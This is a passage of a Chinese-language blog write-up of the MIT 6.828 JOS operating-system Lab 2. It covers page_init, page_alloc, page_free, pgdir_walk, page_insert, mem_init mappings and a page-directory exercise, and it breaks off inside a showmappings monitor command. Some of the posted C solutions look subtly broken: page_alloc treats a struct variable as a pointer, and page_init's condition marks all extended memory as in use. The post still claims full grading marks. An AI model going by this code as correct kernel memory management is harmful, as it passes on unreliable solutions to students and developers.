    <span class="token comment" spellcheck="true">//  3) Then comes the IO hole [IOPHYSMEM, EXTPHYSMEM), which must</span>
    <span class="token comment" spellcheck="true">//     never be allocated.</span>
    <span class="token comment" spellcheck="true">//  4) Then extended memory [EXTPHYSMEM, ...).</span>
    <span class="token comment" spellcheck="true">//     Some of it is in use, some is free. Where is the kernel</span>
    <span class="token comment" spellcheck="true">//     in physical memory?  Which pages are already in use for</span>
    <span class="token comment" spellcheck="true">//     page tables and other data structures?</span>
    <span class="token comment" spellcheck="true">//</span>
    <span class="token comment" spellcheck="true">// Change the code to reflect this.</span>
    <span class="token comment" spellcheck="true">// NB: DO NOT actually touch the physical memory corresponding to</span>
    <span class="token comment" spellcheck="true">// free pages!</span>
    size_t i<span class="token punctuation">;</span>
    page_free_list <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> npages<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            pages<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>pp_ref <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
            pages<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>pp_link <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> npages_basemem<span class="token punctuation">)</span><span class="token punctuation">{</span>
            pages<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>pp_ref <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
            pages<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>pp_link <span class="token operator">=</span> page_free_list<span class="token punctuation">;</span>
            page_free_list <span class="token operator">=</span> <span class="token operator">&amp;</span>pages<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">>=</span> IOPHYSMEM<span class="token operator">/</span>PGSIZE <span class="token operator">&amp;&amp;</span> i <span class="token operator">&lt;</span> EXTPHYSMEM<span class="token operator">/</span>PGSIZE<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            pages<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>pp_ref <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">>=</span> EXTPHYSMEM<span class="token operator">/</span>PGSIZE <span class="token operator">||</span> i <span class="token operator">&lt;</span> <span class="token function">PADDR</span><span class="token punctuation">(</span><span class="token function">boot_alloc</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span>PGSIZE<span class="token punctuation">)</span><span class="token punctuation">{</span>
            pages<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>pp_ref<span class="token operator">++</span><span class="token punctuation">;</span>
            pages<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>pp_link <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token punctuation">{</span>
            pages<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>pp_ref <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
            pages<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>pp_link <span class="token operator">=</span> page_free_list<span class="token punctuation">;</span>
            page_free_list <span class="token operator">=</span> <span class="token operator">&amp;</span>pages<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>之后需要实现page_alloc函数。这个函数是为了分配一个物理页， 返回对应的结构体。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">struct</span> PageInfo <span class="token operator">*</span>
<span class="token function">page_alloc</span><span class="token punctuation">(</span><span class="token keyword">int</span> alloc_flags<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">struct</span> PageInfo result<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>page_free_list<span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

    result <span class="token operator">=</span> page_free_list<span class="token punctuation">;</span>
    page_free_list <span class="token operator">=</span> page_free_list<span class="token operator">-></span>pp_link<span class="token punctuation">;</span>

    result<span class="token operator">-></span>pp_link <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>alloc_flags <span class="token operator">&amp;</span> ALLOC_ZERO<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">memset</span><span class="token punctuation">(</span><span class="token function">page2kva</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> PGSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>最后是实现page_free。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span>
<span class="token function">page_free</span><span class="token punctuation">(</span><span class="token keyword">struct</span> PageInfo <span class="token operator">*</span>pp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// Fill this function in</span>
    <span class="token comment" spellcheck="true">// Hint: You may want to panic if pp->pp_ref is nonzero or</span>
    <span class="token comment" spellcheck="true">// pp->pp_link is not NULL.</span>
    <span class="token function">assert</span><span class="token punctuation">(</span>pp<span class="token operator">-></span>pp_ref <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">assert</span><span class="token punctuation">(</span>pp<span class="token operator">-></span>pp_link <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    pp<span class="token operator">-></span>pp_link <span class="token operator">=</span> page_free_list<span class="token punctuation">;</span>
    page_free_list <span class="token operator">=</span> pp<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<h2 id="Part_2_3A__u865A_u62DF_u5185_u5B58"><a href="#Part_2_3A__u865A_u62DF_u5185_u5B58" class="headerlink" title="Part 2: 虚拟内存"></a>Part 2: 虚拟内存</h2><h3 id="u865A_u62DF_u5185_u5B58"><a href="#u865A_u62DF_u5185_u5B58" class="headerlink" title="虚拟内存"></a>虚拟内存</h3><h4 id="Exercise_2"><a href="#Exercise_2" class="headerlink" title="Exercise 2"></a>Exercise 2</h4><p>熟悉关于分页地址转换(page translation)和基于页的保护(page-based protection)。</p>
<p>首先介绍一下80386将逻辑地址转为物理地址的方法。</p>
<ul>
<li>分段地址转换，由段选择子和段偏移量构成的逻辑地址转为线性地址。</li>
<li>分页地址转换，线性地址转为物理地址。</li>
</ul>
<p><img src="https://pdos.csail.mit.edu/6.828/2016/readings/i386/fig5-1.gif" alt=""></p>
<p>关于页转换段保护之类的还是查看<a href="https://pdos.csail.mit.edu/6.828/2016/readings/i386/toc.htm" target="_blank" rel="external">Intel 80386 Reference Manual</a>.</p>
<h3 id="u865A_u62DF_u5730_u5740_uFF0C_u7EBF_u6027_u5730_u5740_uFF0C_u7269_u7406_u5730_u5740"><a href="#u865A_u62DF_u5730_u5740_uFF0C_u7EBF_u6027_u5730_u5740_uFF0C_u7269_u7406_u5730_u5740" class="headerlink" title="虚拟地址，线性地址，物理地址"></a>虚拟地址，线性地址，物理地址</h3><p>虚拟地址是有段选择子和段偏移构成。线性地址是经过分段地址转换单没进行分页地址转换。物理地址是两种转换之后最终通过硬件总线到RAM的地址。</p>
<pre><code>           Selector  +--------------+         +-----------+
          ----------&gt;|              |         |           |
                     | Segmentation |         |  Paging   |
Software             |              |--------&gt;|           |----------&gt;  RAM
            Offset   |  Mechanism   |         | Mechanism |
          ----------&gt;|              |         |           |
                     +--------------+         +-----------+
            Virtual                   Linear                Physical
</code></pre><p> C 指针是虚拟地址的偏移部分。在 <code>boot/boot.S</code>中，引入全局描述符表(GDT)将所有段基址设为0到 0xffffffff。因此线性地址等于虚拟地址的偏移量。</p>
<h4 id="Exercise_3"><a href="#Exercise_3" class="headerlink" title="Exercise 3"></a>Exercise 3</h4><p>在QEMU中使用 xp 可以查看物理内存，PD虚拟机对于lab手册上调出QEMU monitor的方法没用，通过查资料发现使用这个也能查看 <code>qemu-system-i386 -hda obj/kern/kernel.img -monitor stdio -gdb tcp::26000 -D qemu.log</code>。</p>
<p>在QEMU monitor中使用 <code>info pg</code> 查看当前页表， <code>info mem</code> 查看虚拟内存的范围。</p>
<p>进入保护模式以后，所有地址引用都是虚拟地址，由MMU转换，也就是说 C 指针都是虚拟地址。</p>
<p>JOS内核经常需要操作地址通过整数而不解引用。JOS为了区分两种情况：类型 uintptr_t 代表虚拟地址，physaddr_t 代表物理地址。虽然都是32位整数，但是不能直接解引用，需要先转型。</p>
<p>JOS需要读取或修改内存，尽管只知道物理地址。给页表添加映射需要分配无力内存去储存一个页目录，然后才能初始化内存。然而内核不能绕过虚拟地址转换，因此不能直接加载和储存物理地址。为了将物理地址转为虚拟地址，内核需要在物理地址加上0xf0000000从而找到相关的虚拟地址，可以使用KADDR(pa)完成这个操作。</p>
<p>同样，如果内核需要通过虚拟地址去找物理地址，就需要减去0xf0000000，可以使用PADDR(va)完成这个操作。</p>
<h3 id="u5F15_u7528_u8BA1_u6570"><a href="#u5F15_u7528_u8BA1_u6570" class="headerlink" title="引用计数"></a>引用计数</h3><p>之后实验经常需要将多个虚拟地址同时映射到同一块物理页上，因此需要给每一个物理页计数引用次数，这个值位于物理页 struct PageInfo 中的 pp_ref 字段中。</p>
<h3 id="u9875_u8868_u7BA1_u7406"><a href="#u9875_u8868_u7BA1_u7406" class="headerlink" title="页表管理"></a>页表管理</h3><p>完成页表管理：插入删除线性到物理地址的映射和创建页表。</p>
<h4 id="Exercise_4"><a href="#Exercise_4" class="headerlink" title="Exercise 4"></a>Exercise 4</h4><p>实现<code>kern/pmap.c</code>里的pgdir_walk()，boot_map_region()，page_lookup()，page_remove()，page_insert()这几个函数。check_page()会测试是否写的正确。</p>
<p>首先是 pgdir_walk()，参考注释可以得知，这个函数获得指向线性地址页表项的指针，传入的参数是页目录指针，线性地址(JOS 将虚拟地址直接映射成了线性地址)和另外一个参数。</p>
<p><img src="2.png" alt=""></p>
<p>由上面的图可以知道二级分页模式下线性地址到物理地址的转换。所以首先要获得页目录地址，判断是否指向的页表项存在，不存在则新建一个页表。这里有两个注意点。第一个地方是要注意判断页表是否存在，根据下图页目录/表的结构，可以知道这里的P位代表Present，用来判断对应的物理页是否存在，存在则为1，所以通过与运算来判断。</p>
<p><img src="3.png" alt=""></p>
<p>另外一个注意点是新建页。为新建的物理页设置页目录时，需要添加上权限位。</p>
<pre class=" language-c"><code class="language-c">pte_t <span class="token operator">*</span>
<span class="token function">pgdir_walk</span><span class="token punctuation">(</span>pde_t <span class="token operator">*</span>pgdir<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>va<span class="token punctuation">,</span> <span class="token keyword">int</span> create<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// Fill this function in</span>
    pde_t <span class="token operator">*</span>pt <span class="token operator">=</span> pgdir <span class="token operator">+</span> <span class="token function">PDX</span><span class="token punctuation">(</span>va<span class="token punctuation">)</span><span class="token punctuation">;</span>
    pde_t <span class="token operator">*</span>pt_addr_v<span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span>pt <span class="token operator">&amp;</span> PTE_P<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        pt_addr_v <span class="token operator">=</span> <span class="token punctuation">(</span>pte_t <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">KADDR</span><span class="token punctuation">(</span><span class="token function">PTE_ADDR</span><span class="token punctuation">(</span><span class="token operator">*</span>pt<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> pt_addr_v <span class="token operator">+</span> <span class="token function">PTX</span><span class="token punctuation">(</span>va<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">struct</span> PageInfo <span class="token operator">*</span>newpt<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>create <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>newpt <span class="token operator">=</span> <span class="token function">page_alloc</span><span class="token punctuation">(</span>ALLOC_ZERO<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">memset</span><span class="token punctuation">(</span><span class="token function">page2kva</span><span class="token punctuation">(</span>newpt<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> PGSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
            newpt<span class="token operator">-></span>pp_ref <span class="token operator">++</span><span class="token punctuation">;</span>
            <span class="token operator">*</span>pt <span class="token operator">=</span> <span class="token function">PADDR</span><span class="token punctuation">(</span><span class="token function">page2kva</span><span class="token punctuation">(</span>newpt<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">|</span>PTE_U<span class="token operator">|</span>PTE_W<span class="token operator">|</span>PTE_P<span class="token punctuation">;</span>
            pt_addr_v <span class="token operator">=</span> <span class="token punctuation">(</span>pte_t <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">KADDR</span><span class="token punctuation">(</span><span class="token function">PTE_ADDR</span><span class="token punctuation">(</span><span class="token operator">*</span>pt<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> pt_addr_v <span class="token operator">+</span> <span class="token function">PTX</span><span class="token punctuation">(</span>va<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>接着是boot_map_region函数，这个函数将虚拟地址[va, va+size)映射到物理地址[pa, pa+size)，注释中提到可以使用上面写的pgdir_walk，获取页表地址，接着将物理地址的值与上权限位赋给页表地址。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span>
<span class="token function">boot_map_region</span><span class="token punctuation">(</span>pde_t <span class="token operator">*</span>pgdir<span class="token punctuation">,</span> uintptr_t va<span class="token punctuation">,</span> size_t size<span class="token punctuation">,</span> physaddr_t pa<span class="token punctuation">,</span> <span class="token keyword">int</span> perm<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// Fill this function in</span>
    <span class="token keyword">int</span> offset<span class="token punctuation">;</span>
    pte_t <span class="token operator">*</span>pt<span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>offset <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> offset <span class="token operator">&lt;</span> size<span class="token punctuation">;</span> offset <span class="token operator">+</span><span class="token operator">=</span> PGSIZE<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        pt <span class="token operator">=</span> <span class="token function">pgdir_walk</span><span class="token punctuation">(</span>pgdir<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>va<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token operator">*</span>pt <span class="token operator">=</span> pa<span class="token operator">|</span>perm<span class="token operator">|</span>PTE_P<span class="token punctuation">;</span>
        pa <span class="token operator">+</span><span class="token operator">=</span> PGSIZE<span class="token punctuation">;</span>
        va <span class="token operator">+</span><span class="token operator">=</span> PGSIZE<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>之后是page_lookup函数，查找线性地址va对应的物理页面，找到就返回这个物理页，否则返回NULL。首先如果pte_store非0，则储存这个页的页表地址，这一步是为了之后的page_remove用的。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">struct</span> PageInfo <span class="token operator">*</span>
<span class="token function">page_lookup</span><span class="token punctuation">(</span>pde_t <span class="token operator">*</span>pgdir<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>va<span class="token punctuation">,</span> pte_t <span class="token operator">*</span><span class="token operator">*</span>pte_store<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// Fill this function in</span>
    pte_t <span class="token operator">*</span>pte <span class="token operator">=</span> <span class="token function">pgdir_walk</span><span class="token punctuation">(</span>pgdir<span class="token punctuation">,</span> va<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>pte_store <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token operator">*</span>pte_store <span class="token operator">=</span> pte<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>pte <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token operator">*</span>pte <span class="token operator">&amp;</span> PTE_P<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token function">pa2page</span><span class="token punctuation">(</span><span class="token function">PTE_ADDR</span><span class="token punctuation">(</span><span class="token operator">*</span>pte<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>page_remove函数算是比较容易的，参考注释里的提示，先通过page_lookup获得物理页，如果存在则执行删除工作page_decref，同时也要将va地址的页表项设为0，最后就是验证有效性。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span>
<span class="token function">page_remove</span><span class="token punctuation">(</span>pde_t <span class="token operator">*</span>pgdir<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>va<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// Fill this function in</span>
    pte_t <span class="token operator">*</span>pte<span class="token punctuation">;</span>
    <span class="token keyword">struct</span> PageInfo <span class="token operator">*</span>page <span class="token operator">=</span> <span class="token function">page_lookup</span><span class="token punctuation">(</span>pgdir<span class="token punctuation">,</span> va<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pte<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>page<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">page_decref</span><span class="token punctuation">(</span>page<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token operator">*</span>pte <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token function">tlb_invalidate</span><span class="token punctuation">(</span>pgdir<span class="token punctuation">,</span> va<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>最后一步就是page_insert函数，将页面管理结构 pp 所对应的物理页面分配给线性地址 va。同时,将对应的页表项的 permission 设置成 PTE_P&amp;perm。 注意:一定要考虑到线性地址 va 已经指向了另外一个物理页面或者干脆就是这个函数要指向的物理页面的情况。如果线性地址 va 已经指向了另外一个物理页面,则先要调用 page_remove 将该物理页从线性地址 va 处删除,再将 va 对应的页表项的地址赋值为 pp 对应 的物理页面。如果 va 指向的本来就是参数 pp 所对应的物理页面,则将 va 对应的页表项中 的物理地址赋值重新赋值为 pp 所对应的物理页面的首地址即可。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span>
<span class="token function">page_insert</span><span class="token punctuation">(</span>pde_t <span class="token operator">*</span>pgdir<span class="token punctuation">,</span> <span class="token keyword">struct</span> PageInfo <span class="token operator">*</span>pp<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>va<span class="token punctuation">,</span> <span class="token keyword">int</span> perm<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// Fill this function in</span>
    pte_t <span class="token operator">*</span>pte <span class="token operator">=</span> <span class="token function">pgdir_walk</span><span class="token punctuation">(</span>pgdir<span class="token punctuation">,</span> va<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>pte<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token operator">-</span>E_NO_MEM<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>  
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span>pte <span class="token operator">&amp;</span> PTE_P<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">PTE_ADDR</span><span class="token punctuation">(</span><span class="token operator">*</span>pte<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">page2pa</span><span class="token punctuation">(</span>pp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">tlb_invalidate</span><span class="token punctuation">(</span>pgdir<span class="token punctuation">,</span> va<span class="token punctuation">)</span><span class="token punctuation">;</span>
            pp<span class="token operator">-></span>pp_ref<span class="token operator">--</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token function">page_remove</span><span class="token punctuation">(</span>pgdir<span class="token punctuation">,</span> va<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token operator">*</span>pte <span class="token operator">=</span> <span class="token function">page2pa</span><span class="token punctuation">(</span>pp<span class="token punctuation">)</span> <span class="token operator">|</span> perm <span class="token operator">|</span> PTE_P<span class="token punctuation">;</span>
    pp<span class="token operator">-></span>pp_ref<span class="token operator">++</span><span class="token punctuation">;</span>
    pgdir<span class="token punctuation">[</span><span class="token function">PDX</span><span class="token punctuation">(</span>va<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">|</span><span class="token operator">=</span> perm<span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<h2 id="Part_3_3A__u5185_u6838_u5730_u5740_u7A7A_u95F4"><a href="#Part_3_3A__u5185_u6838_u5730_u5740_u7A7A_u95F4" class="headerlink" title="Part 3: 内核地址空间"></a>Part 3: 内核地址空间</h2><h3 id="u7EBF_u6027_u5730_u5740_u7684_u4E24_u90E8_u5206"><a href="#u7EBF_u6027_u5730_u5740_u7684_u4E24_u90E8_u5206" class="headerlink" title="线性地址的两部分"></a>线性地址的两部分</h3><p>JOS将处理器32位线性地址划分为占低地址的用户环境(进程)和占高地址的内核。 分界线是<code>inc/memlayout.h</code>中的变量 ULIM。内核保留了大约256MB的虚拟地址空间，lab1中内核设在那么高的地址就是因为要留一部分空间给用户环境。</p>
<h3 id="u8BBF_u95EE_u6743_u9650_u548C_u6545_u969C_u9694_u79BB"><a href="#u8BBF_u95EE_u6743_u9650_u548C_u6545_u969C_u9694_u79BB" class="headerlink" title="访问权限和故障隔离"></a>访问权限和故障隔离</h3><p>内核和用户内存都在各自的环境地址空间中，必须在x86页表中使用访问权限位(Permissions bits)来使用户代码只访问用户的地址空间，否则用户的代码bug会覆盖内核数据，造成系统崩溃。值得注意的是可写权限位(PTE_W)可以同时影响用户和内核代码。 </p>
<p>高于ULIM的内存内核可以读写，而用户环境没有权限。内核和用户在地址[UTOP,ULIM)有同样的权限：可读但不可写，这部分地址空间通常是一些特定的内核数据，让用户环境可以读取。最后，地址UTOP之下的是用户环境。</p>
<h3 id="u521D_u59CB_u5316_u5185_u6838_u5730_u5740_u7A7A_u95F4"><a href="#u521D_u59CB_u5316_u5185_u6838_u5730_u5740_u7A7A_u95F4" class="headerlink" title="初始化内核地址空间"></a>初始化内核地址空间</h3><p>设置UTOP之上的地址空间。在<code>inc/memlayout.h</code>中显示了布局。</p>
<h4 id="Exercise_5"><a href="#Exercise_5" class="headerlink" title="Exercise 5"></a>Exercise 5</h4><p>完成mem_init()中缺少的部分。</p>
<p>因为mem_init开头创建了初始化页目录kern_pgdir，首先是将pages数组映射到线性地址UPAGES，权限是内核只读。</p>
<pre class=" language-c"><code class="language-c"><span class="token function">boot_map_region</span><span class="token punctuation">(</span>kern_pgdir<span class="token punctuation">,</span> UPAGES<span class="token punctuation">,</span> PTSIZE<span class="token punctuation">,</span> <span class="token function">PADDR</span><span class="token punctuation">(</span>pages<span class="token punctuation">)</span><span class="token punctuation">,</span>PTE_U<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>接着是映射物理地址到内核栈，也就是从地址范围[KSTACKTOP-KSTKSIZE, KSTACKTOP)映射到bootstack开始的物理地址页上，注释中提到了，只要映射[KSTACKTOP-KSTKSIZE, KSTACKTOP)， [KSTACKTOP-PTSIZE, KSTACKTOP-KSTKSIZE)不映射，权限位是内核读写。</p>
<pre class=" language-c"><code class="language-c"><span class="token function">boot_map_region</span><span class="token punctuation">(</span>kern_pgdir<span class="token punctuation">,</span> KSTACKTOP<span class="token operator">-</span>KSTKSIZE<span class="token punctuation">,</span> KSTKSIZE<span class="token punctuation">,</span> <span class="token function">PADDR</span><span class="token punctuation">(</span>bootstack<span class="token punctuation">)</span><span class="token punctuation">,</span> PTE_W<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>最后是映射虚拟地址[KERNBASE, 2^32)到物理地址[0, 2^32 - KERNBASE)，权限位是内核读写。</p>
<pre class=" language-c"><code class="language-c"><span class="token function">boot_map_region</span><span class="token punctuation">(</span>kern_pgdir<span class="token punctuation">,</span> KERNBASE<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">0xffffffff</span><span class="token operator">-</span>KERNBASE<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> PTE_W<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>这时候运行<code>grade-lab2</code>应该是拿到了全部分数。</p>
<p><img src="4.png" alt=""></p>
<h4 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h4><p>2.填写这个页目录，可以参考<code>inc/memlayout.h</code></p>
<pre><code>| Entry | Base Virtual Address |  Points to (logically):  |
| ----- | -----:   | :----: |
|  1023 | 0xffc00000  |   Page table for top 4MB of phys memory   |
|  1022 | 0xff800000  |   .    |
|   .   |      .      |   .    |
|  960  | 0xf0000000  |   KERNBASE |
|   .   |      .      |   .    |
|   2   | 0x00800000  |   Program Data &amp; Heap     |
|   1   | 0x00400000  |   Empty Memory (*)    |
|   0   | 0x00000000  |   Empty Memory    | 
</code></pre><p>3.为什么用户不能改内核代码？因为没有权限。</p>
<p>其他问题有点不确定思路，先放着吧。</p>
<h4 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h4><p>添加一个显示页映射的功能。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">mon_showmappings</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">struct</span> Trapframe <span class="token operator">*</span>tf<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">extern</span> pte_t <span class="token operator">*</span><span class="token function">pgdir_walk</span><span class="token punctuation">(</span>pde_t <span class="token operator">*</span>pgdir<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>va<span class="token punctuation">,</span> <span class="token keyword">int</span> create<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">extern</span> pde_t <span class="token operator">*</span>kern_pgdir<span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
